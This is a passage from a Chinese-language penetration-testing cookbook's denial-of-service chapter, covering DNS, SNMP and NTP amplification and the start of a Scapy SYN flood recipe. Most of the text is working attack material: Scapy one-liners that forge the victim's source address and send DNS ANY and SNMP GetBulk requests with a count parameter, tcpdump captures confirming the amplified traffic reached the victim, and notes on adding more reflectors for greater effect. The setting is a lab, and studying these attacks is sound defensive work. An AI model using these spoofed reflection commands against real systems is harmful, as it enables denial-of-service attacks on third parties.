19:07:15.448636 IP (tos 0x0, ttl 128, id 11359, offset 0, flags [none], proto UDP (17), length 350) resolver2.opendns.com.domain > 172.16.36.135. domain: [udp sum ok] 0 q: ANY? google.com. 16/0/0 google.com. A yyz08s13in-f14.1e100.net, google.com. A yyz08s13-in-f6.1e100.net, google.com. A yyz08s13-in-f2.1e100.net, google.com. A yyz08s13-in-f0.1e100.net, google. com. A yyz08s13-in-f3.1e100.net, google.com. A yyz08s13-in-f1.1e100. net, google.com. A yyz08s13-in-f9.1e100.net, google.com. A yyz08s13in-f7.1e100.net, google.com. A yyz08s13-in-f8.1e100.net, google.com. A yyz08s13-in-f4.1e100.net, google.com. A yyz08s13-in-f5.1e100.net, google. com. NS ns2.google.com., google.com. NS ns1.google.com., google.com. NS ns3.google.com., google.com. NS ns4.google.com., google.com. SOA ns1. google.com. dns-admin.google.com. 1545677 7200 1800 1209600 300 (322) 
```

这个执行 DNS 放大的整个过程，实际上可以用 Scapy 中的单行命令来执行。 此命令使用所有与上一个练习中讨论的相同的值。 然后可以修改`count`值以定义要发送到受害服务器的载荷响应数：

```
>>> send(IP(dst="208.67.220.220",src="172.16.36.135")/UDP()/DNS(rd=1,qdco unt=1,qd=DNSQR(qname="google.com",qtype=255)),verbose=1,count=2) 
.. 
Sent 2 packets.

```

### 工作原理

放大攻击的原理是利用第三方设备，使网络流量压倒目标。 对于多数放大攻击，必须满足两个条件：

+   用于执行攻击的协议不验证请求源
+   来自所使用的网络功能的响应应该显着大于用于请求它的请求。

DNS 放大攻击的效率取决于 DNS 查询的响应大小。 另外，可以通过使用多个 DNS 服务器来增加攻击的威力。

## 6.5 SNMP 放大 DoS 攻击

SNMP 扩展攻击通过伪造具有大型响应的查询，来利用团体字符串可预测的 SNMP 设备。 通过使用分布式 DDoS 组件，以及通过同时向多个 SNMP 设备发送请求，可以提高这种攻击的效率。

### 准备

为了模拟 SNMP 放大攻击，你需要有一个启用 SNMP 的设备。 所提供的示例使用 Windows XP 设备。 有关设置 Windows 系统的更多信息，请参阅本书第一章中的“安装 Windows Server”秘籍。 此外，此秘籍将 Ubuntu 用作扫描目标。 有关设置 Ubuntu 的更多信息，请参阅本书第一章中的“安装 Ubuntu Server”秘籍。

### 操作步骤

为了开始，我们应该初始化一个 SNMP 查询，使其返回到我们的系统，来评估要使用的载荷大小。 为了发送我们的 SNMP 查询请求，我们必须首先构建此请求的层级。 我们需要构建的第一层是 IP 层：

```
>>> i = IP() 
>>> i.display() 
###[ IP ]###
  version= 4
  ihl= None
  tos= 0x0
  len= None
  id= 1
  flags=
  frag= 0
  ttl= 64
  proto= ip
  chksum= None
  src= 127.0.0.1
  dst= 127.0.0.1
  \options\ 
>>> i.dst = "172.16.36.134" 
>>> i.display() 
###[ IP ]###
  version= 4
  ihl= None
  tos= 0x0
  len= None
  id= 1
  flags=
  frag= 0
  ttl= 64
  proto= ip
  chksum= None
  src= 172.16.36.224
  dst= 172.16.36.134
  \options\
```

要构建我们的请求的 IP 层，我们应该将 `IP` 对象赋给变量`i`。 通过调用`display()`函数，我们可以确定该对象的属性配置。 通常，发送和接收地址都设为回送地址`127.0.0.1`。 可以通过将`i.dst`设置为广播地址的字符串值，来更改目标地址并修改这些值。 通过再次调用`display()`函数，我们可以看到，不仅更新了目的地址，而且`Scapy`也会自动将源 IP 地址更新为与默认接口相关的地址。 现在我们已经构建了请求的 IP 层，我们应该继续构建 UDP 层：

```
>>> u = UDP() 
>>> u.display() 
###[ UDP ]###  
sport= domain
dport= domain  
len= None  
chksum= None
```

要构建我们的请求的 UDP 层，我们将使用与 IP 层相同的技术。 在提供的示例中，`UDP` 对象赋给了`u`变量。 如前所述，可以通过调用`display()`函数来确定默认配置。 在这里，我们可以看到源和目标端口的默认值都列为`domain`。 您可能能猜到，这表示与端口 53 相关的 DNS 服 务。你可能已经猜到，它需要修改为 SNMP 相关的端口：

```
>>> u.dport = 161 
>>> u.sport = 161 
>>> u.display() 
###[ UDP ]###  
    sport= snmp  
    dport= snmp  
    len= None  
    chksum= None 
```

要将源端口和目标端口更改为 SNMP，应将整数值 161 传递给它; 此值对应于与服务关联的 UDP 端口。 这些更改可以通过再次调用`display()`函数来验证。 现在已经构建了 IP 和 UDP 层，我们需要构建 SNMP 层：

```
>>> snmp = SNMP() 
>>> snmp.display() 
###[ SNMP ]###
  version= v2c
  community= 'public'
  \PDU\
   |###[ SNMPget ]###
   | id= 0
   | error= no_error
   | error_index= 0
   |
  \varbindlist\
```

为了构建我们的请求的 SNMP 层，我们将使用与 IP 和 UDP 层相同的技术。 在提供的示例中，`SNMP` 对象已赋给`snmp`变量。 如前所述，可以通过调用`display()`函数来标识默认配置。 现在已经构建了 IP，UDP 和 SNMP 层，我们需要构建一个批量请求来替换默认赋给 `PDU` 值的`SNMPget`请求：

```
>>> bulk = SNMPbulk() 
>>> bulk.display() 
###[ SNMPbulk ]###  
    id= 0  
    non_repeaters= 0  
    max_repetitions= 0  
    \varbindlist\ 
```

为了构建 SNMP 批量请求，我们将使用与 IP，UDP 和 SNMP 层相同的技术。 在提供的示例中，SNMP 批量请求已赋给了`bulk `变量。 如前所述，可以通过调用`display()`函数来确认默认配置。 在这里，我们可以看到有几个值需要修改：

```
>>> bulk.max_repetitions = 50 
>>> bulk.varbindlist=[SNMPvarbind(oid=ASN1_OID('1.3.6.1.2.1.1')),SNMPvarb ind(oid=ASN1_OID('1.3.6.1.2.1.19.1.3'))] 
>>> bulk.display() 
###[ SNMPbulk ]###  
    id= 0  
    non_repeaters= 0  
    max_repetitions= 50  
    \varbindlist\   
    |###[ SNMPvarbind ]###   
    |  oid= <ASN1_OID['.1.3.6.1.2.1.1']>   
    |  value= <ASN1_NULL[0]>   
    |###[ SNMPvarbind ]###   
    |  oid= <ASN1_OID['.1.3.6.1.2.1.19.1.3']>   
    |  value= <ASN1_NULL[0]>

```

SNMP `varbindlist`需要修改来包含查询的 OID 值。 此外，`max_repetitions`赋了整数值为 50。现在批量请求已配置完毕，批量请求对象应赋给`SNMP PDU`值：

```
>>> snmp.PDU = bulk 
>>> snmp.display() 
###[ SNMP ]###  
version= v2c  
community= 'public'
  \PDU\
   |###[ SNMPbulk ]###
   | id= 0
   | non_repeaters= 0
   | max_repetitions= 50
   | \varbindlist\
   |
   |###[ SNMPvarbind ]###
   |
   | oid= <ASN1_OID['.1.3.6.1.2.1.1']>
   |
   | value= <ASN1_NULL[0]>
   |
   |###[ SNMPvarbind ]###
   |
   | oid= <ASN1_OID['.1.3.6.1.2.1.19.1.3']>
   |
   | value= <ASN1_NULL[0]> 
```

我们可以通过调用`display()`函数来验证批量请求是否已赋给`SNMP PDU`值。 现在已经构建了 IP，UDP 和 SNMP 层，并且批量请求已经配置并赋给 SNMP 层，我们可以通过堆叠这些层来构造请求：

```
>>> request = (i/u/snmp) 
>>> request.display() 
###[ IP ]###
  version= 4
  ihl= None
  tos= 0x0
  len= None
  id= 1
  flags=
  frag= 0
  ttl= 64
  proto= udp
  chksum= None
  src= 172.16.36.224
  dst= 172.16.36.134
  \options\ 
###[ UDP ]###
     sport= snmp   
     dport= snmp    
     len= None    
     chksum= None 
###[ SNMP ]###
        version= v2c     
        community= 'public'   
        \PDU\       
        |###[ SNMPbulk ]###   
        |  id= 0      
        |  non_repeaters= 0    
        |  max_repetitions= 50   
        |  \varbindlist\        
        | 
        |###[ SNMPvarbind ]###   
        |  
        |  oid= <ASN1_OID['.1.3.6.1.2.1.1']>   
        | 
        |  value= <ASN1_NULL[0]>   
        |  
        |###[ SNMPvarbind ]###   
        | 
        |  oid= <ASN1_OID['.1.3.6.1.2.1.19.1.3']>  
        |  
        |  value= <ASN1_NULL[0]>
```

可以通过使用斜杠分隔变量来堆叠 IP，UDP 和 SNMP 层。 然后可以将这些层赋给表示整个请求的新变量。 然后可以调用`display()`函数来查看请求的配置。 一旦建立了请求，就可以将其传递给发送和接收函数，以便我们可以分析响应：

```
>>> ans = sr1(request,verbose=1,timeout=5) 
Begin emission: 
Finished to send 1 packets.

Received 1 packets, got 1 answers, remaining 0 packets 
>>> ans.display()

###[ IP ]###
  version= 4L
  ihl= 5L
  tos= 0x0
  len= 1500
  id= 27527
  flags= MF
  frag= 0L
  ttl= 128
  proto= udp
  chksum= 0x803
  src= 172.16.36.134
  dst= 172.16.36.224
  \options\ 
###[ UDP ]###
   sport= snmp
   dport= snmp
   len= 2161
   chksum= 0xdcbf 
###[ Raw ]###
     load= '0\x82\x08e\x02\x01\x01\x04\x06public\xa2\x82\x08V\x02\ x01\x00\x02\x01\x00\x02\x01\x000\x82\x08I0\x81\x8b\x06\x08+\x06\x01\x02\ x01\x01\x01\x00\x04\x7fHardware: x86 Family 6 Model 58 Stepping 9 AT/AT COMPATIBLE - Software: Windows 2000 Version 5.1 (Build 2600 Uniprocessor Free)0\x10\x06\t+\x06\x01\x02\x01\x19\x01\x01\x00C\x03p\xff?0\x18\x06\ x08+\x06\x01\x02\x01\x01\x02\x00\x06\x0c+\x06\x01\x04\x01\x827\x01\x01\ x03\x01\x010\x15\x06\t+\x06\x01\x02\x01\x19\x01\x02\x00\x04\x08\x07\xde\ x02\x19\x08\r\x1d\x030\x0f\x06\x08+\x06\x01\x02\x01\x01\x03\x00C\x03o\ x8e\x8a0\x0e\x06\t+\x06\x01\x02\x01\x19\x01\x03\x00\x02\x01\x000\x0c\ x06\x08+\x06\x01\x02\x01\x01\x04\x00\x04\x000\r\x06\t+\x06\x01\x02\x01\ x19\x01\x04\x00\x04\x000\x1b\x06\x08+\x06\x01\x02\x01\x01\x05\x00\x04\ x0fDEMO-72E8F41CA40\x0e\x06\t+\x06\x01\x02\x01\x19\x01\x05\x00B\x01\x020\ x0c\x06\x08+\x06\x01\x02\x01\x01\x06\x00\x04\x000\x0e\x06\t+\x06\x01\ x02\x01\x19\x01\x06\x00B\x01/0\r\x06\x08+\x06\x01\x02\x01\x01\x07\x00\ x02\x01L0\x0e\x06\t+\x06\x01\x02\x01\x19\x01\x07\x00\x02\x01\x000\r\x06\ x08+\x06\x01\x02\x01\x02\x01\x00\x02\x01\x020\x10\x06\t+\x06\x01\x02\x01\ x19\x02\x02\x00\x02\x03\x1f\xfd\xf00\x0f\x06\n+\x06\x01\x02\x01\x02\x02\ x01\x01\x01\x02\x01\x010\x10\x06\x0b+\x06\x01\x02\x01\x19\x02\x03\x01\ x01\x01\x02\x01\x010\x0f\x06\n+\x06\x01\x02\x01\x02\x02\x01\x01\x02\x02\ x01\x020\x10\x06\x0b+\x06\x01\x02\x01\x19\x02\x03\x01\x01\x02\x02\x01\ x020(\x06\n+\x06\x01\x02\x01\x02\x02\x01\x02\x01\x04\x1aMS TCP Loopback interface\x000\x10\x06\x0b+\x06\x01\x02\x01\x19\x02\x03\x01\x01\x03\x02\x01\x030P\x06\n+\x06\x01\x02\x01\x02\x02\x01\x02\x02\x04BAMD PCNET Family PCI Ethernet Adapter - Packet Scheduler Miniport\x000\x10\x06\x0b+\x06\ x01\x02\x01\x19\x02\x03\x01\x01\x04\x02\x01\x040\x0f\x06\n+\x06\x01\x02\ x01\x02\x02\x01\x03\x01\x02\x01\x180\x10\x06\x0b+\x06\x01\x02\x01\x19\ x02\x03\x01\x01\x05\x02\x01\x050\x0f\x06\n+\x06\x01\x02\x01\x02\x02\x01\ x03\x02\x02\x01\x060\x18\x06\x0b+\x06\x01\x02\x01\x19\x02\x03\x01\x02\ x01\x06\t+\x06\x01\x02\x01\x19\x02\x01\x050\x10\x06\n+\x06\x01\x02\x01\ x02\x02\x01\x04\x01\x02\x02\x05\xf00\x18\x06\x0b+\x06\x01\x02\x01\x19\ x02\x03\x01\x02\x02\x06\t+\x06\x01\x02\x01\x19\x02\x01\x040\x10\x06\n+\ x06\x01\x02\x01\x02\x02\x01\x04\x02\x02\x02\x05\xdc0\x18\x06\x0b+\x06\ x01\x02\x01\x19\x02\x03\x01\x02\x03\x06\t+\x06\x01\x02\x01\x19\x02\x01\ x070\x12\x06\n+\x06\x01\x02\x01\x02\x02\x01\x05\x01B\x04\x00\x98\x96\ x800\x18\x06\x0b+\x06\x01\x02\x01\x19\x02\x03\x01\x02\x04\x06\t+\x06\ x01\x02\x01\x19\x02\x01\x030\x12\x06\n+\x06\x01\x02\x01\x02\x02\x01\x05\ x02B\x04;\x9a\xca\x000\x18\x06\x0b+\x06\x01\x02\x01\x19\x02\x03\x01\x02\ x05\x06\t+\x06\x01\x02\x01\x19\x02\x01\x020\x0e\x06\n+\x06\x01\x02\x01\ x02\x02\x01\x06\x01\x04\x000\x12\x06\x0b+\x06\x01\x02\x01\x19\x02\x03\ x01\x03\x01\x04\x03A:\\0\x14\x06\n+\x06\x01\x02\x01\x02\x02\x01\x06\x02\ x04\x06\x00\x0c)\x18\x11\xfb01\x06\x0b+\x06\x01\x02\x01\x19\x02\x03\x01\ x03\x02\x04"C:\\ Label:  Serial Number 5838200b0\x0f\x06\n+\x06\x01\x02\ x01\x02\x02\x01\x07\x01\x02\x01\x010\x12\x06\x0b+\x06\x01\x02\x01\x19\ x02\x03\x01\x03\x03\x04\x03D:\\0\x0f\x06\n+\x06\x01\x02\x01\x02\x02\x01\ x07\x02\x02\x01\x010\x1d\x06\x0b+\x06\x01\x02\x01\x19\x02\x03\x01\x03\ x04\x04\x0eVirtual Memory0\x0f\x06\n+\x06\x01\x02\x01\x02\x02\x01\x08\ x01\x02\x01\x010\x1e\x06\x0b+\x06\x01\x02\x01\x19\x02\x03\x01\x03\x05\ x04\x0fPhysical Memory0\x0f\x06\n+\x06\x01\x02\x01\x02\x02\x01\x08\x02\ x02\x01\x010\x10\x06\x0b+\x06\x01\x02\x01\x19\x02\x03\x01\x04\x01\x02\ x01\x000\x0f\x06\n+\x06\x01\x02\x01\x02\x02\x01\t\x01C\x01\x000\x11\x06\ x0b+\x06\x01\x02\x01\x19\x02\x03\x01\x04\x02\x02\x02\x10\x000\x11\x06\ n+\x06\x01\x02\x01\x02\x02\x01\t\x02C\x03m\xbb00\x10\x06\x0b+\x06\x01\ x02\x01\x19\x02\x03\x01\x04\x03\x02\x01\x000\x12\x06\n+\x06\x01\x02\x01\ x02\x02\x01\n\x01A\x04\x05\xcb\xd6M0\x12\x06\x0b+\x06\x01\x02\x01\x19\ x02\x03\x01\x04\x04\x02\x03\x01\x00\x000\x11\x06\n+\x06\x01\x02\x01\x02\ x02\x01\n\x02A\x03\x06\xb1\xa80\x12\x06\x0b+\x06\x01\x02\x01\x19\x02\x03\ x01\x04\x05\x02\x03\x01\x00\x000\x11\x06\n+\x06\x01\x02\x01\x02\x02\x01\ x0b\x01A\x03\rR\x920\x10\x06\x0b+\x06\x01\x02\x01\x19\x02\x03\x01\x05\ x01\x02\x01\x000\x10\x06\n+\x06\x01\x02\x01\x02\x02\x01\x0b\x02A\x02\x0c\ xfe0\x13\x06\x0b+\x06\x01\x02\x01\x19\x02\x03\x01\x05\x02\x02\x04\x00\ x9f\xf6a0\x0f\x06\n+\x06\x01\x02\x01\x02\x02\x01\x0c\x01A\x01\x000\x10\ x06\x0b+\x06\x01\x02\x01\x19\x02\x03\x01\x05\x03\x02\x01\x000' 
```


响应确认了我们已经成功构建了所需请求，并且与最初生成的相对较小请求相比，已经请求了相当大的载荷。 与之相似，整个过程可以使用 Scapy 中的单个命令来执行。 此命令使用所有与上一个练习中讨论的相同的值：

```
>>> sr1(IP(dst="172.16.36.134")/UDP(sport=161,dport=161)/ SNMP(PDU=SNMPbulk(max_repetitions=50,varbindlist=[SNMPvarbind(oid=ASN1_OD('1.3.6.1.2.1.1')),SNMPvarbind(oid=ASN1_OID('1.3.6.1.2.1.19.1.3'))])),ve rbose=1,timeout=5)

Begin emission: Finished to send 1 packets.

<IP  version=4L ihl=5L tos=0x0 len=1500 id=14170 flags=MF frag=0L ttl=128 proto=udp chksum=0x3c30 src=172.16.36.134 dst=172.16.36.224 options=[] |<UDP  sport=snmp dport=snmp len=2162 chksum=0xd961 |<Raw  load='0\x82\ x08f\x02\x01\x01\x04\x06public\xa2\x82\x08W\x02\x01\x00\x02\x01\x00\ x02\x01\x000\x82\x08J0\x81\x8b\x06\x08+\x06\x01\x02\x01\x01\x01\x00\ x04\x7fHardware: x86 Family 6 Model 58 Stepping 9 AT/AT COMPATIBLE - Software: Windows 2000 Version 5.1 (Build 2600 Uniprocessor Free)0\x11\ x06\t+\x06\x01\x02\x01\x19\x01\x01\x00C\x04\x00\xa3i\xad0\x18\x06\x08+\ x06\x01\x02\x01\x01\x02\x00\x06\x0c+\x06\x01\x04\x01\x827\x01\x01\x03\ x01\x010\x15\x06\t+\x06\x01\x02\x01\x19\x01\x02\x00\x04\x08\x07\xde\x02\ x19\t\x08!\x010\x0f\x06\x08+\x06\x01\x02\x01\x01\x03\x00C\x03t\x99\x180\ x0e\x06\t+\x06\x01\x02\x01\x19\x01\x03\x00\x02\x01\x000\x0c\x06\x08+\ x06\x01\x02\x01\x01\x04\x00\x04\x000\r\x06\t+\x06\x01\x02\x01\x19\x01\ x04\x00\x04\x000\x1b\x06\x08+\x06\x01\x02\x01\x01\x05\x00\x04\x0fDEMO72E8F41CA40\x0e\x06\t+\x06\x01\x02\x01\x19\x01\x05\x00B\x01\x020\x0c\x06\ x08+\x06\x01\x02\x01\x01\x06\x00\x04\x000\x0e\x06\t+\x06\x01\x02\x01\ x19\x01\x06\x00B\x01/0\r\x06\x08+\x06\x01\x02\x01\x01\x07\x00\x02\x01L0\ x0e\x06\t+\x06\x01\x02\x01\x19\x01\x07\x00\x02\x01\x000\r\x06\x08+\x06\ x01\x02\x01\x02\x01\x00\x02\x01\x020\x10\x06\t+\x06\x01\x02\x01\x19\x02\ x02\x00\x02\x03\x1f\xfd\xf00\x0f\x06\n+\x06\x01\x02\x01\x02\x02\x01\x01\ x01\x02\x01\x010\x10\x06\x0b+\x06\x01\x02\x01\x19\x02\x03\x01\x01\x01\ x02\x01\x010\x0f\x06\n+\x06\x01\x02\x01\x02\x02\x01\x01\x02\x02\x01\x020\ x10\x06\x0b+\x06\x01\x02\x01\x19\x02\x03\x01\x01\x02\x02\x01\x020(\x06\ n+\x06\x01\x02\x01\x02\x02\x01\x02\x01\x04\x1aMS TCP Loopback interface\ x000\x10\x06\x0b+\x06\x01\x02\x01\x19\x02\x03\x01\x01\x03\x02\x01\x030P\ x06\n+\x06\x01\x02\x01\x02\x02\x01\x02\x02\x04BAMD PCNET Family PCI Ethernet Adapter - Packet Scheduler Miniport\x000\x10\x06\x0b+\x06\x01\ x02\x01\x19\x02\x03\x01\x01\x04\x02\x01\x040\x0f\x06\n+\x06\x01\x02\x01\ x02\x02\x01\x03\x01\x02\x01\x180\x10\x06\x0b+\x06\x01\x02\x01\x19\x02\ x03\x01\x01\x05\x02\x01\x050\x0f\x06\n+\x06\x01\x02\x01\x02\x02\x01\x03\ x02\x02\x01\x060\x18\x06\x0b+\x06\x01\x02\x01\x19\x02\x03\x01\x02\x01\ x06\t+\x06\x01\x02\x01\x19\x02\x01\x050\x10\x06\n+\x06\x01\x02\x01\x02\ x02\x01\x04\x01\x02\x02\x05\xf00\x18\x06\x0b+\x06\x01\x02\x01\x19\x02\ x03\x01\x02\x02\x06\t+\x06\x01\x02\x01\x19\x02\x01\x040\x10\x06\n+\x06\ x01\x02\x01\x02\x02\x01\x04\x02\x02\x02\x05\xdc0\x18\x06\x0b+\x06\x01\ x02\x01\x19\x02\x03\x01\x02\x03\x06\t+\x06\x01\x02\x01\x19\x02\x01\x070\ x12\x06\n+\x06\x01\x02\x01\x02\x02\x01\x05\x01B\x04\x00\x98\x96\x800\ x18\x06\x0b+\x06\x01\x02\x01\x19\x02\x03\x01\x02\x04\x06\t+\x06\x01\x02\ x01\x19\x02\x01\x030\x12\x06\n+\x06\x01\x02\x01\x02\x02\x01\x05\x02B\ x04;\x9a\xca\x000\x18\x06\x0b+\x06\x01\x02\x01\x19\x02\x03\x01\x02\x05\ x06\t+\x06\x01\x02\x01\x19\x02\x01\x020\x0e\x06\n+\x06\x01\x02\x01\x02\ x02\x01\x06\x01\x04\x000\x12\x06\x0b+\x06\x01\x02\x01\x19\x02\x03\x01\ x03\x01\x04\x03A:\\0\x14\x06\n+\x06\x01\x02\x01\x02\x02\x01\x06\x02\x04\ x06\x00\x0c)\x18\x11\xfb01\x06\x0b+\x06\x01\x02\x01\x19\x02\x03\x01\x03\x02\x04"C:\\ Label:  Serial Number 5838200b0\x0f\x06\n+\x06\x01\x02\x01\ x02\x02\x01\x07\x01\x02\x01\x010\x12\x06\x0b+\x06\x01\x02\x01\x19\x02\ x03\x01\x03\x03\x04\x03D:\\0\x0f\x06\n+\x06\x01\x02\x01\x02\x02\x01\x07\ x02\x02\x01\x010\x1d\x06\x0b+\x06\x01\x02\x01\x19\x02\x03\x01\x03\x04\ x04\x0eVirtual Memory0\x0f\x06\n+\x06\x01\x02\x01\x02\x02\x01\x08\x01\ x02\x01\x010\x1e\x06\x0b+\x06\x01\x02\x01\x19\x02\x03\x01\x03\x05\x04\ x0fPhysical Memory0\x0f\x06\n+\x06\x01\x02\x01\x02\x02\x01\x08\x02\x02\ x01\x010\x10\x06\x0b+\x06\x01\x02\x01\x19\x02\x03\x01\x04\x01\x02\x01\ x000\x0f\x06\n+\x06\x01\x02\x01\x02\x02\x01\t\x01C\x01\x000\x11\x06\x0b+\ x06\x01\x02\x01\x19\x02\x03\x01\x04\x02\x02\x02\x10\x000\x11\x06\n+\x06\ x01\x02\x01\x02\x02\x01\t\x02C\x03m\xbb00\x10\x06\x0b+\x06\x01\x02\x01\ x19\x02\x03\x01\x04\x03\x02\x01\x000\x12\x06\n+\x06\x01\x02\x01\x02\x02\ x01\n\x01A\x04\x08OB_0\x12\x06\x0b+\x06\x01\x02\x01\x19\x02\x03\x01\x04\ x04\x02\x03\x01\x00\x000\x11\x06\n+\x06\x01\x02\x01\x02\x02\x01\n\x02A\ x03\rIe0\x12\x06\x0b+\x06\x01\x02\x01\x19\x02\x03\x01\x04\x05\x02\x03\ x01\x00\x000\x11\x06\n+\x06\x01\x02\x01\x02\x02\x01\x0b\x01A\x03\x13\x14\ xde0\x10\x06\x0b+\x06\x01\x02\x01\x19\x02\x03\x01\x05\x01\x02\x01\x000\ x10\x06\n+\x06\x01\x02\x01\x02\x02\x01\x0b\x02A\x02\x1e\xc10\x13\x06\ x0b+\x06\x01\x02\x01\x19\x02\x03\x01\x05\x02\x02\x04\x00\x9f\xf6a0\x0f\ x06\n+\x06\x01\x02\x01\x02\x02\x01\x0c\x01A\x01\x000\x10\x06\x0b+\x06\ x01\x02\x01\x19\x02\x03\x01\x05\x03\x02\x01\x00' |>>> 
```

为了实际将此命令用作攻击，源 IP 地址需要更改为目标系统的 IP 地址。 这样，我们应该能够将载荷重定向给那个受害者。 这可以通过将 IP `src`值更改为目标 IP 地址的字符串来完成：

```
>>> send(IP(dst="172.16.36.134",src="172.16.36.135")/ UDP(sport=161,dport=161)/SNMP(PDU=SNMPbulk(max_repetitions=50,varbindlist =[SNMPvarbind(oid=ASN1_OID('1.3.6.1.2.1.1')),SNMPvarbind(oid=ASN1_OID('1. 3.6.1.2.1.19.1.3'))])),verbose=1,count=2) 
. 
Sent 2 packets. 
```

`send()`函数应该用于发送这些伪造请求，因为响应返回预期不会给本地接口。 要确认载荷是否到达目标系统，可以使用 TCPdump 捕获传入流量：

```
admin@ubuntu:~$ sudo tcpdump -i eth0 -vv src 172.16.36.134 
tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 96 bytes 
13:32:14.210732 IP (tos 0x0, ttl 128, id 5944, offset 0, flags [+], proto UDP (17), length 1500) 172.16.36.134.snmp > 172.16.36.135.snmp:  [len1468<asnlen2150] 
13:32:14.210732 IP (tos 0x0, ttl 128, id 5944, offset 1480, flags [none], proto UDP (17), length 702) 172.16.36.134 > 172.16.36.135: udp
13:32:35.133384 IP (tos 0x0, ttl 128, id 8209, offset 0, flags [+], proto UDP (17), length 1500) 172.16.36.134.snmp > 172.16.36.135.snmp:  [len1468<asnlen2150] 
13:32:35.133384 IP (tos 0x0, ttl 128, id 8209, offset 1480, flags [none], proto UDP (17), length 702) 172.16.36.134 > 172.16.36.135: udp

4 packets captured 
4 packets received by filter 
0 packets dropped by kernel 
```

在所提供的示例中，TCPdump 配置为捕获`eth0`接口上，来自源 IP 地址`172.16.36.134`（SNMP 主机的 IP 地址）的流量。

### 工作原理

放大攻击的原理是利用第三方设备，使网络流量压倒目标。 对于多数放大攻击，必须满足两个条件：

+   用于执行攻击的协议不验证请求源
+   来自所使用的网络功能的响应应该显着大于用于请求它的请求。

SNMP 放大攻击的效率取决于 SNMP 查询的响应大小。 另外，可以通过使用多个 SNMP 服务器来增加攻击的威力。

## 6.6 NTP 放大 DoS 攻击

NTP 放大 DoS 攻击利用响应远程 monlist 请求的网络时间协议（NTP）服务器。 monlist 函数返回与服务器交互的所有设备的列表，在某些情况下最多达 600 个列表。 攻击者可以伪造来自目标 IP 地址的请求，并且漏洞服务器将为每个发送的请求返回非常大的响应。 在写这本书的时候，这仍然是一个常见的威胁，目前正在大规模使用。 因此，我将仅演示如何测试 NTP 服务器，以确定它们是否将响应远程 monlist 请求。 补丁程序可用于大多数 NTP 服务来解决此问题，并且任何有存在漏洞的设备应该修复或下线。

### 准备

为了确定是否可以利用 NTP 服务器执行 NTP 放大攻击，你需要有启用 NTP 的设备。 在提供的示例中，Ubuntu 用于托管 NTP 服务。 有关设置 Ubuntu 的更多信息，请参阅本书第一章中的“安装 Ubuntu Server”秘籍。

### 操作步骤

为了确定远程服务器是否运行 NTP 服务，Nmap 可用于快速扫描 UDP 端口 123。 `-sU`选项可用于指定 UDP，然后可使用`-p`选项来指定端口 ：

```
root@KaliLinux:~# nmap -sU 172.16.36.224 -p 123

Starting Nmap 6.25 ( http://nmap.org ) at 2014-02-24 18:12 EST 
Nmap scan report for 172.16.36.224 
Host is up (0.00068s latency). 
PORT    STATE SERVICE 
123/udp open  ntp 
MAC Address: 00:0C:29:09:C3:79 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.10 seconds
```

如果远程服务器上运行 NTP 服务，则扫描应返回打开状态。 Kali Linux 上默认安装的另一个工具可用于确定 NTP 服务是否可用于放大攻击。 NTPDC 工具可用于尝试对远程服务执行 monlist 命令：

```
root@KaliLinux:~# ntpdc -n -c monlist 172.16.36.224 
172.16.36.224: timed out, nothing received 
***Request timed out
```

理想情况下，我们希望看到的是没有响应返回。 在所提供的第一个示例中，请求超时，并且未接收到输出。 这表明服务器不易受攻击，并且 monlist 命令只能在本地执行：

```
root@KaliLinux:~# ntpdc -c monlist 172.16.36.3 
remote address          port local address      count m ver rstr avgint  lstint
========================================================================= ====== 
host.crossing.com        123 172.16.36.3           18 4 4    1d0     35       1 
grub.ca.us.roller.o      123 172.16.36.3           17 4 4    1d0     37      35 
va-time.utility.o        123 172.16.36.3           17 4 4    1d0     37      59 
cheezpuff.meatball.n     123 172.16.36.3           17 4 4    1d0     38      62 
pwnbox.lizard.com        123 172.16.36.3           35 4 4    5d0     65      51 
```

或者，如果返回了一系列主机和连接元数据，则远程服务器可能能够用于放大攻击。 对于与服务器交互的每个新主机，会在此列表中添加一个新条目，响应的大小以及可能的载荷会变得更大。


放大攻击的原理是利用第三方设备，使网络流量压倒目标。 对于多数放大攻击，必须满足两个条件：

+   用于执行攻击的协议不验证请求源
+   来自所使用的网络功能的响应应该显着大于用于请求它的请求。

NTP  放大攻击的效率取决于 NTP  查询的响应大小。 另外，可以通过使用多个 NTP  服务器来增加攻击的威力。

## 6.7 SYN 泛洪 DoS 攻击

SYN 泛洪 DoS 攻击是一种资源消耗攻击。 它的原理是向作为攻击目标的服务相关的远程端口发送大量 TCP SYN 请求。 对于目标服务接收的每个初始 SYN 分组，然后会发送出 SYN + ACK 分组并保持连接打开，来等待来自发起客户端的最终 ACK 分组。 通过使用这些半开请求使目标过载，攻击者可以使服务无响应。

### 准备

为了使用 Scapy 对目标执行完整的 SYN 泛洪，你需要有一个运行 TCP 网络服务的远程系统。 提供的示例使用 Metasploitable2 的实例用。 有关设置 Metasploitable2 的更多信息，请参阅本书第一章中的“安装 Metasploitable2”秘籍。 此外，本节需要使用文本编辑器（如 VIM 或 Nano）将脚本写入文件系统。 有关编写脚本的更多信息，请参阅本书第一章中的“使用文本编辑器（VIM 和 Nano）”秘籍。

### 操作步骤

为了使用 Scapy 执行 SYN 泛洪，我们需要通过与目标服务关联的端口发送 TCP SYN 请求来开始。 为了向任何给定端口发送 TCP SYN 请求，我们必须首先构建此请求的层级。 我们将需要构建的第一层是 IP 层：

```
root@KaliLinux:~# scapy Welcome to Scapy (2.2.0) 
>>> i = IP() 
>>> i.display() 
###[ IP ]###
  version= 4
  ihl= None
  tos= 0x0
  len= None
  id= 1
  flags=
  frag= 0
  ttl= 64
  proto= ip
  chksum= None
  src= 127.0.0.1
  dst= 127.0.0.1
  \options\ 
>>> i.dst = "172.16.36.135"
>>> i.display()
###[ IP ]###
  version= 4
  ihl= None
  tos= 0x0
  len= None
  id= 1
  flags=
  frag= 0
  ttl= 64
  proto= ip
  chksum= None
  src= 172.16.36.224
  dst= 172.16.36.135
  \options\
```

要构建我们的请求的 IP 层，我们应该将 `IP` 对象赋给变量`i`。 通过调用`display()`函数，我们可以确定该对象的属性配置。 通常，发送和接收地址都设为回送地址`127.0.0.1`。 可以通过将`i.dst`设置为广播地址的字符串值，来更改目标地址并修改这些值。 通过再次调用`display()`函数，我们可以看到，不仅更新了目的地址，而且`Scapy`也会自动将源 IP 地址更新为与默认接口相关的地址。 现在我们已经构建了请求的 IP 层，我们应该继续构建 TCP 层：

```
>>> t = TCP() 
>>> t.display() 
###[ TCP ]###
  sport= ftp_data
  dport= http
